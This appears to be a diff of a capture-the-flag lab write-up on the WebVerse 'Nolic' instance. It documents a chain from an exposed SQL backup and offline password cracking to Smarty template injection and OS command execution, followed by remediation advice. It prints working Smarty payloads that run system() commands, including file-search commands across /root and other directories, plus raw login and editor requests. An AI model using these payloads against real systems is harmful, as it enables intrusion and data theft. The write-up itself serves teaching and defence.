@@ -1,7 +1,7 @@
 ---
 title: "WebVerse Nolic — Exposed Backup to Smarty SSTI and Remote Code Execution"
 date: 2026-08-04T00:00:00+02:00
-lastmod: 2026-08-11T00:00:00+02:00
+lastmod: 2026-08-13T00:00:00+02:00
 draft: false
 author: "Mdk22"
 description: "An anonymously exposed SQL backup enabled offline administrator credential recovery, followed by verified Smarty SSTI and operating-system command execution."
@@ -133,7 +133,11 @@ Testing was limited to the deliberately vulnerable Nolic instance and followed t
 
 Caido supplied the authoritative request and response evidence. Chromium confirmed the rendered Smarty, command, locator, and final flag behavior. Python performed offline digest verification and field-level restoration comparison.
 
-## 3. Canonical Host and Public Route Disclosure
+## 3. Evidence-Led Chronological Reproduction
+
+This section binds every request, command, payload, screenshot, expected result, and narrow conclusion to the exact phase in which it was used. Caido, browser, and terminal captures remain the proof layer; the adjacent code blocks provide the reproducibility layer. No `curl` command was executed, so none is added retrospectively.
+
+### 3.1 Canonical Host and Public Route Discovery
 
 The fresh instance used `10.100.0.30`. Requesting the IP-based `robots.txt` route returned HTTP 301 with a `Location` header pointing to `http://nolic.local/robots.txt`. This established the active virtual host without relying on historical material.
 
@@ -141,7 +145,14 @@ The fresh instance used `10.100.0.30`. Requesting the IP-based `robots.txt` rout
 
 **Figure 1 — Canonical host.** The current instance redirects the IP-based request to `nolic.local/robots.txt`.
 
-The canonical file returned HTTP 200 and disclosed three routes:
+**R-01 — Canonical `robots.txt` request.**
+
+```http
+GET /robots.txt HTTP/1.1
+Host: <LAB_HOST>
+```
+
+**Expected semantic result:** HTTP 200 on the canonical host with `Disallow` entries for `/backups/`, `/admin/`, and `/login.php`.
 
 ```text
 Disallow: /backups/
@@ -151,144 +162,61 @@ Disallow: /login.php
 
 ![robots.txt discloses backup, admin, and login routes](Nolic_Figure_02_Robots_Disclosure.png)
 
-**Figure 2 — Route disclosure.** The file identifies relevant routes but is treated only as reconnaissance; exploitability required direct follow-up.
+**Figure 2 — Route disclosure.** The canonical file identifies relevant routes but is treated only as reconnaissance; exploitability required direct follow-up.
 
-## 4. Anonymous Backup Exposure
+### 3.2 Anonymous Backup Discovery and Retrieval
 
-`GET /backups/` returned HTTP 200 with an Apache directory index. It listed one SQL artifact, `nolic-backup-2025-06-01.sql`, without requiring authentication.
+The application-disclosed backup route was followed directly. No adjacent path or filename was guessed.
 
-![Anonymous Apache directory index listing the Nolic SQL backup](Nolic_Figure_03_Backup_Directory_Listing.png)
-
-**Figure 3 — Directory listing.** The backup filename and metadata were publicly browsable.
-
-Requesting the exact listed file returned HTTP 200, `Content-Type: application/sql`, and a 16,294-byte database dump. The dump defined `admin_users`, `posts`, and `admin_sessions`. Its administrator record contained the username `wren` and a 64-character hexadecimal password digest; the digest is redacted from the public figure.
-
-![Downloaded SQL backup with the administrator password digest redacted](Nolic_Figure_04_SQL_Backup_Credential_Record_REDACTED.png)
-
-**Figure 4 — Backup contents.** The response proves anonymous retrieval of a real SQL dump and privileged credential material.
-
-The directory index is mapped to CWE-548. The actual retrievable backup is mapped separately and more precisely to CWE-530; route disclosure alone would not have established backup exposure.
-
-## 5. Bounded Offline Credential Recovery
-
-The exposed digest was tested locally against `/usr/share/wordlists/rockyou.txt`. A SHA-256 match occurred after 26 candidates, and the recovered password was eight bytes long. No requests were sent to Nolic during this phase, and neither the digest nor plaintext password is published.
-
-![Redacted offline SHA-256 verification output showing a match after 26 candidates](Nolic_Figure_05_Offline_SHA256_Recovery_REDACTED.png)
-
-**Figure 5 — Offline verification.** The result establishes the algorithm and matching candidate without exposing the credential.
-
-Digest shape was not used as the sole basis for calling it SHA-256. Reproducing the stored value with an actual SHA-256 candidate match confirmed the algorithm. The weakness is therefore mapped to CWE-916 rather than a generic credential category.
-
-## 6. Authentication and Administrative Mapping
-
-The login page submitted `username` and `password` to `POST /login.php`. One controlled login using the recovered credential returned HTTP 302, issued a `NOLICSESS` cookie, and redirected to `/admin/dashboard.php`. The cookie value is redacted.
-
-![Successful login response with the NOLICSESS value redacted](Nolic_Figure_06_Login_Session_Response.png)
-
-**Figure 6 — Authentication.** HTTP 302, session issuance, and the dashboard redirect prove that the offline-recovered credential was accepted.
-
-The authenticated dashboard listed six posts: five published and one draft. The only draft was `id=6`, titled “Marginalia for the modern reader,” with slug `marginalia-for-the-modern-reader`.
-
-![Dashboard response identifies post id 6 as the sole draft](Nolic_Figure_07_Draft_Post_Mapping.png)
-
-**Figure 7 — Authoritative draft mapping.** The dashboard state prevented accidental modification of a published article.
-
-## 7. Draft Baseline and Restoration Snapshot
-
-The editor at `POST /admin/edit_post.php?id=6` exposed the fields `title`, `slug`, `excerpt`, `body`, `status`, and `tags`. The draft option was checked. Before mutation, every original value and `status=draft` was saved and hashed.
-
-While the post remained a draft, the exact article slug returned HTTP 200 to the authenticated administrator and HTTP 404 when replayed without the session cookie. No separate preview endpoint, preview button, or JavaScript preview mechanism was required for the verified rendering workflow.
-
-![Anonymous no-cookie replay returns HTTP 404 for the authenticated draft route](Nolic_Figure_08_Anonymous_Draft_Baseline.png)
-
-**Figure 8 — Anonymous control.** The same draft route returned HTTP 404 without the session cookie.
-
-This control established two facts at once: the draft was not anonymously exposed, and an authenticated administrator could use it as a rendering oracle. Every later probe retained `status=draft`, changed only the body, observed the authenticated rendering, and then restored the original field set.
-
-## 8. Smarty Server-Side Template Injection
-
-The first mutation appended a unique marker containing a harmless Smarty arithmetic expression while preserving the original title, slug, excerpt, and tags:
-
-```smarty
-<p>NOLIC_SSTI_A1_{math equation="7*7"}_END</p>
-```
-
-The authenticated draft response contained:
-
-```text
-NOLIC_SSTI_A1_49_END
-```
-
-The raw `{math ...}` source was absent from the rendered response.
-
-![Smarty arithmetic expression evaluates to 49 in the article response](Nolic_Figure_09_Smarty_Arithmetic_Evaluation.png)
-
-**Figure 9 — Template evaluation.** The deterministic `49` result distinguishes server-side template processing from storage, reflection, or ordinary HTML rendering.
-
-After the observation, the complete original draft was restored and verified before continuing.
-
-## 9. Operating-System Command Execution
-
-The second mutation used a deterministic command with no file or state impact:
-
-```smarty
-<p>NOLIC_RCE_B1_{system('expr 31415 + 27182')}_END</p>
-```
-
-During authenticated draft rendering, the article rendered:
-
-```text
-NOLIC_RCE_B1_58597 58597_END
-```
-
-The value `58597` was not present in the stored source. PHP `system()` emits command output and returns its last output line, which explains the duplicated value when the function result is also rendered by the Smarty/PHP path.
-
-![Browser-rendered deterministic operating-system command result](Nolic_Figure_10_OS_Command_Execution.png)
-
-**Figure 10 — Command execution.** Dynamic operating-system output proves escalation from template evaluation to command execution with the web application process's privileges.
-
-The test did not use a reverse shell, persistence mechanism, destructive command, or privilege escalation.
-
-## 10. Bounded Flag Discovery
-
-A short common-path allowlist was tested first. The command completion marker rendered, but no candidate was found. This negative control proved command execution without assuming a flag location.
-
-A second locator searched only `/var/www`, `/opt`, `/app`, `/srv`, `/home`, `/tmp`, `/root`, and `/challenge`. It was constrained to one filesystem, maximum depth 6, readable regular files, flag-shaped filenames, and 40 results. File contents were not read during this phase.
-
-The locator returned one readable flag-shaped candidate. Its current-instance path is intentionally omitted from this public update.
-
-![Bounded filename-only locator identifies one readable flag-shaped candidate](Nolic_Figure_11_Bounded_Flag_Locator.png)
-
-**Figure 11 — Bounded locator.** The result establishes a readable candidate path, not its content.
-
-## 11. Reproduction Commands and Payloads
-
-These blocks contain only requests, payloads, and local helpers that were actually used and verified during the authorized reproduction. The surrounding Caido, browser, and terminal figures remain the proof layer; these blocks are the reproducibility layer. No `curl` command was executed, so none is added retrospectively.
-
-### R-01 — Canonical `robots.txt` request
-
-```http
-GET /robots.txt HTTP/1.1
-Host: <LAB_HOST>
-```
-
-Expected semantic result: HTTP 200 on the canonical host with `Disallow` entries for `/backups/`, `/admin/`, and `/login.php`.
-
-### R-02 / R-03 — Anonymous backup access
+**R-02 — Anonymous backup index.**
 
 ```http
 GET /backups/ HTTP/1.1
 Host: <LAB_HOST>
 ```
 
+**Expected semantic result:** an anonymously accessible Apache directory index listing the available backup artifact.
+
+![Anonymous Apache directory index listing the Nolic SQL backup](Nolic_Figure_03_Backup_Directory_Listing.png)
+
+**Figure 3 — Directory listing.** The HTTP 200 response makes the backup filename and metadata publicly browsable.
+
+**R-03 — Exact listed backup.**
+
 ```http
 GET /backups/nolic-backup-2025-06-01.sql HTTP/1.1
 Host: <LAB_HOST>
 ```
 
-The first request returned an Apache directory index. The second retrieved only the SQL artifact named by that listing.
+**Expected semantic result:** HTTP 200 with the SQL artifact named by the authoritative directory listing.
 
-### R-04 — Login request shape
+The response used `Content-Type: application/sql` and contained a 16,294-byte database dump defining `admin_users`, `posts`, and `admin_sessions`. Its administrator record contained the username `wren` and a 64-character hexadecimal password digest; the digest is redacted from the public figure.
+
+![Downloaded SQL backup with the administrator password digest redacted](Nolic_Figure_04_SQL_Backup_Credential_Record_REDACTED.png)
+
+**Figure 4 — Backup contents.** The response proves anonymous retrieval of a real SQL dump and privileged credential material. The directory index maps to CWE-548, while the separately verified downloadable backup maps more precisely to CWE-530.
+
+### 3.3 Bounded Offline Credential Recovery
+
+The exposed digest was tested locally against `/usr/share/wordlists/rockyou.txt`. This phase generated no request to Nolic.
+
+**C-01 — Executed offline verification helper.**
+
+```text
+python3 Nolic_EV06_Offline_SHA256_Recovery.py
+```
+
+**Expected semantic result:** a SHA-256 candidate match without online guessing or disclosure of the stored digest or recovered plaintext.
+
+![Redacted offline SHA-256 verification output showing a match after 26 candidates](Nolic_Figure_05_Offline_SHA256_Recovery_REDACTED.png)
+
+**Figure 5 — Offline verification.** A match occurred after 26 candidates and the recovered password was eight bytes long. Digest shape alone was not treated as proof of SHA-256; reproducing the stored value with an actual candidate match confirmed the algorithm and supports CWE-916.
+
+### 3.4 Authentication and Session Establishment
+
+One controlled login used the recovered credential.
+
+**R-04 — Login request shape.**
 
 ```http
 POST /login.php HTTP/1.1
@@ -298,9 +226,31 @@ Content-Type: application/x-www-form-urlencoded
 username=<REDACTED>&password=<REDACTED>
 ```
 
-Expected semantic result: HTTP 302, a redacted `NOLICSESS` value, and the authenticated dashboard redirect.
+**Expected semantic result:** HTTP 302, issuance of a redacted `NOLICSESS` cookie, and a redirect to `/admin/dashboard.php`.
 
-### R-05 / R-06 — Authenticated baseline and anonymous control
+![Successful login response with the NOLICSESS value redacted](Nolic_Figure_06_Login_Session_Response.png)
+
+**Figure 6 — Authentication.** HTTP 302, session issuance, and the dashboard redirect prove that the offline-recovered credential was accepted.
+
+### 3.5 Authoritative Draft Mapping
+
+The authenticated dashboard listed six posts: five published and one draft. The only draft was `id=6`, titled “Marginalia for the modern reader,” with slug `marginalia-for-the-modern-reader`.
+
+![Dashboard response identifies post id 6 as the sole draft](Nolic_Figure_07_Draft_Post_Mapping.png)
+
+**Figure 7 — Authoritative draft mapping.** The dashboard state identifies the one valid rendering candidate and prevents accidental modification of a published article.
+
+### 3.6 Draft Baseline, Anonymous Control, and Restoration Snapshot
+
+The editor exposed `title`, `slug`, `excerpt`, `body`, `status`, and `tags`, with the draft option checked. Before mutation, every original value and `status=draft` was saved and hashed.
+
+**C-02 — Executed draft-snapshot helper.**
+
+```text
+python3 Nolic_EV09_Create_Draft_Snapshot.py
+```
+
+**R-05 — Authenticated draft baseline.**
 
 ```http
 GET /post.php?slug=<REDACTED> HTTP/1.1
@@ -308,14 +258,22 @@ Host: <LAB_HOST>
 Cookie: NOLICSESS=<SESSION_COOKIE>
 ```
 
+**Expected semantic result:** HTTP 200 for the authenticated administrator while `status=draft` remains unchanged.
+
+**R-06 — Equivalent anonymous control.**
+
 ```http
 GET /post.php?slug=<REDACTED> HTTP/1.1
 Host: <LAB_HOST>
 ```
 
-The authenticated draft baseline returned HTTP 200. The equivalent no-cookie control returned HTTP 404.
+**Expected semantic result:** HTTP 404 for the same draft route without the session cookie.
 
-### R-07 — Authenticated editor request shape
+![Anonymous no-cookie replay returns HTTP 404 for the authenticated draft route](Nolic_Figure_08_Anonymous_Draft_Baseline.png)
+
+**Figure 8 — Anonymous control.** The differential establishes that the draft was not anonymously exposed and that the authenticated route could serve as the controlled rendering oracle.
+
+**R-07 — Authenticated editor request shape used for each mutation and restoration.**
 
 ```http
 POST /admin/edit_post.php?id=<OBJECT_ID> HTTP/1.1
@@ -326,80 +284,114 @@ Cookie: NOLICSESS=<SESSION_COOKIE>
 <title/slug/excerpt/body/status/tags form fields>&status=draft
 ```
 
-Only the verified request contract is published; dynamic session, object, and original-form values remain placeholders.
+Only the verified request contract is published; dynamic session, object, and original-form values remain placeholders. Every later probe changed only the body, retained `status=draft`, observed the authenticated rendering, and restored the complete original field set.
 
-### P-01 — Smarty arithmetic evaluation
+### 3.7 Harmless Smarty Evaluation
+
+The first mutation appended a unique marker containing a harmless arithmetic expression while preserving the original title, slug, excerpt, tags, and draft status.
+
+**P-01 — Smarty arithmetic evaluation.**
 
 ```smarty
 <p>NOLIC_SSTI_A1_{math equation="7*7"}_END</p>
 ```
 
-Expected semantic result: `NOLIC_SSTI_A1_49_END`; raw Smarty syntax is absent from the rendered response.
+**Expected semantic result:** `NOLIC_SSTI_A1_49_END`, with the raw Smarty source absent from the rendered response.
 
-### P-02 — Deterministic command-execution proof
+```text
+NOLIC_SSTI_A1_49_END
+```
+
+![Smarty arithmetic expression evaluates to 49 in the article response](Nolic_Figure_09_Smarty_Arithmetic_Evaluation.png)
+
+**Figure 9 — Template evaluation.** The deterministic `49` result distinguishes server-side template processing from storage, reflection, or ordinary HTML rendering. The complete original draft was restored and verified before continuing.
+
+### 3.8 Deterministic Operating-System Command Execution
+
+The next bounded mutation used a deterministic command with no file or state impact.
+
+**P-02 — Command-execution proof.**
 
 ```smarty
 <p>NOLIC_RCE_B1_{system('expr 31415 + 27182')}_END</p>
 ```
 
-Expected semantic result: dynamic result `58597` appears in the marker. This establishes command execution but not file location or readability.
+**Expected semantic result:** dynamic result `58597` appears inside the controlled marker. This establishes command execution but not file location or readability.
 
-### P-03 — Common-path negative control
+During authenticated rendering, the article returned:
+
+```text
+NOLIC_RCE_B1_58597 58597_END
+```
+
+The value was not present in the stored source. PHP `system()` emits command output and returns its last output line, explaining the duplicated value when the function result is also rendered by the Smarty/PHP path.
+
+![Browser-rendered deterministic operating-system command result](Nolic_Figure_10_OS_Command_Execution.png)
+
+**Figure 10 — Command execution.** Dynamic operating-system output proves escalation from template evaluation to execution with the web application process's privileges. No reverse shell, persistence, destructive command, or privilege escalation was attempted.
+
+### 3.9 Negative Control and Bounded File Locator
+
+A short common-path allowlist was tested before broader filename discovery. This prevented an assumed flag location from being presented as evidence.
+
+**P-03 — Common-path negative control.**
 
 ```smarty
 <pre>NOLIC_FLAG_C1_BEGIN {system('for p in /flag /flag.txt /root/flag /root/flag.txt /var/www/flag /var/www/flag.txt /var/www/html/flag /var/www/html/flag.txt /app/flag /app/flag.txt /opt/flag /opt/flag.txt; do [ -r "$p" ] && echo "NOLIC_COMMON_HIT:$p"; done; echo NOLIC_COMMON_DONE')} NOLIC_FLAG_C1_END</pre>
 ```
 
-Expected semantic result: the completion marker renders with no common-path hit.
+**Expected semantic result:** the completion marker renders with no common-path hit.
 
-### P-04 — Bounded filename-only locator
+The negative result was followed by a locator constrained to selected roots, one filesystem, maximum depth 6, readable regular files, flag-shaped filenames, and 40 results. No file content was read during discovery.
+
+**P-04 — Bounded filename-only locator.**
 
 ```smarty
 <pre>NOLIC_FLAG_D1_BEGIN {system('find /var/www /opt /app /srv /home /tmp /root /challenge -xdev -maxdepth 6 -type f -readable \( -iname flag -o -iname flag.txt -o -iname "*flag*" \) 2>/dev/null | head -n 40 | sed "s#^#NOLIC_FLAG_CANDIDATE:#"; echo NOLIC_LOCATOR_DONE')} NOLIC_FLAG_D1_END</pre>
 ```
 
-Expected semantic result: at most 40 readable flag-shaped filenames are returned. The current-instance candidate path is omitted publicly.
+**Expected semantic result:** at most 40 readable flag-shaped filenames, with the current-instance candidate path omitted from the public article.
 
-### P-05 — Exact final read
+![Bounded filename-only locator identifies one readable flag-shaped candidate](Nolic_Figure_11_Bounded_Flag_Locator.png)
 
-The final payload read only the one candidate confirmed by P-04 and surrounded the result with a unique marker. Its exact current-instance path, secret-bearing command syntax, and returned flag are intentionally described rather than published. During authenticated rendering, the article returned HTTP 200 and a current-instance flag matching the expected WebVerse format. The public evidence replaces the complete value with `WEBVERSE{REDACTED}`.
+**Figure 11 — Bounded locator.** One readable candidate was returned. This establishes a candidate path, not its content.
+
+### 3.10 Exact Read, Deterministic Restoration, and Authoritative Completion
+
+**P-05 — Exact final read.** The final payload read only the single candidate confirmed by P-04 and surrounded the result with a unique marker. Its exact current-instance path, secret-bearing command syntax, and returned flag remain intentionally unpublished.
+
+**Expected semantic result:** HTTP 200 during authenticated rendering with one current-instance value matching the expected WebVerse format. The public representation replaces the literal value with `WEBVERSE{REDACTED}`.
 
 ![Public-safe exact flag read with the current-instance value redacted](Nolic_Figure_12_Final_Flag_Read_REDACTED.png)
 
-**Figure 12 — Exact read.** The one candidate confirmed by the bounded locator returned the redacted current-instance flag between the controlled markers.
+**Figure 12 — Exact read.** The one candidate established by the bounded locator returned the redacted current-instance flag between controlled markers. No further file contents or unrelated paths were read.
 
-No further file contents or unrelated paths were read.
+The original `title`, `slug`, `excerpt`, `body`, `tags`, and `status=draft` values were restored from the captured snapshot rather than by manual editing. A fresh editor response was parsed and every field compared by value, length, and SHA-256 digest.
 
-### C-01 to C-04 — Executed local helpers
+**C-03 / C-04 — Executed restoration helpers.**
 
 ```text
-python3 Nolic_EV06_Offline_SHA256_Recovery.py
-python3 Nolic_EV09_Create_Draft_Snapshot.py
 python3 Nolic_EV12_Generate_Exact_Restore_Body.py
 python3 Nolic_EV12_Verify_Draft_Restoration.py
 ```
-
-These commands performed offline SHA-256 candidate testing, draft-state capture, deterministic restoration-body generation, and field-level restoration verification. They do not represent additional target-side requests.
-
-## 12. Deterministic State Restoration
-
-The original `title`, `slug`, `excerpt`, `body`, `tags`, and `status=draft` values were captured before the first payload. Restoration requests were generated from that snapshot rather than by manual editing. A fresh editor response was parsed after each captured cycle, and every field was compared by value, length, and SHA-256 digest.
 
 ![Field-level restoration verification for the modified Nolic draft](Nolic_Figure_13_Restoration_Verification.png)
 
 **Figure 13 — Restoration verification.** All recorded fields match their original digests, the draft status is restored, no probe marker remains, and `restoration_verified=true`.
 
-The deterministic mechanism was independently captured after the arithmetic, command-execution, common-path, and locator cycles. The same restore request was executed after the exact flag read, but a separate post-flag restoration screenshot was not retained because the evidence-upload limit had been reached. The final cleanup is therefore tester-attested; the article does not present Figure 13 as a separately captured post-flag restoration.
+The deterministic mechanism was independently captured after the arithmetic, command-execution, common-path, and locator cycles. The same restore request was executed after the exact flag read, but a separate post-flag restoration screenshot was not retained because the evidence-upload limit had been reached. Final cleanup is therefore tester-attested; Figure 13 is not presented as a separately captured post-flag restoration.
 
-## 13. Authoritative Solved State
-
-The recovered current-instance value was submitted to WebVerse. The platform accepted it and marked Nolic solved.
+The recovered current-instance value was then submitted to WebVerse. The platform accepted it and marked Nolic solved.
 
 ![WebVerse Nolic lab solved confirmation](Nolic_Figure_14_Solved_State.png)
 
 **Figure 14 — Authoritative solved state.** WebVerse independently confirms that the final recovered value was correct for this instance.
 
-## 14. Vulnerability Classification
+> **STOP BOUNDARY**
+>
+> The objective was submitted only after the exact read and restoration sequence. No further target-side enumeration, file access, or exploit expansion was performed.
+
+## 4. Vulnerability Classification
 
 | ROLE | CWE | EVIDENCE-BASED RELEVANCE |
 | --- | --- | --- |
@@ -411,7 +403,7 @@ The recovered current-instance value was submitted to WebVerse. The platform acc
 
 CWE-1336 is the primary mapping because unsafe template compilation was the decisive application weakness. CWE-78 records the demonstrated command-execution consequence. The backup and password mappings explain how an external actor obtained the authenticated precondition.
 
-## 15. False-Positive Controls
+## 5. False-Positive Controls
 
 The conclusion does not rely on a single response or assumption:
 
@@ -428,7 +420,7 @@ The conclusion does not rely on a single response or assumption:
 11. Captured restoration cycles used full field equality rather than visual inspection.
 12. WebVerse independently accepted the recovered flag.
 
-## 16. Impact
+## 6. Impact
 
 The verified chain provides an external attacker with a path from anonymous access to operating-system command execution. Once authenticated, the attacker can execute commands with the privileges of the web application process. The confirmed reproduction demonstrated access to one readable flag file.
 
@@ -436,7 +428,7 @@ In a production environment, plausible consequences could include reading applic
 
 The individual findings vary in severity, but the complete anonymous-backup-to-command-execution chain warrants critical treatment. The authentication requirement does not materially break the external path because the application exposed the password material used to obtain that session.
 
-## 17. Remediation
+## 7. Remediation
 
 ### Remove Backups From the Web Tier
 
@@ -454,7 +446,7 @@ Assign stored post content as data inside a fixed Smarty template. Do not compil
 
 Enable a restrictive Smarty security policy and allowlist only required functions. Remove access to `system`, `exec`, `shell_exec`, `passthru`, `proc_open`, and related primitives. Run the application as a dedicated least-privileged service account that cannot traverse or read unrelated home directories; add AppArmor, SELinux, container, or equivalent confinement where appropriate.
 
-## 18. Validation After the Fix
+## 8. Validation After the Fix
 
 - `/backups/` and the former SQL URL should be unreachable or return a non-disclosing denial.
 - Deployment artifacts and the web root should contain no backup or database exports.
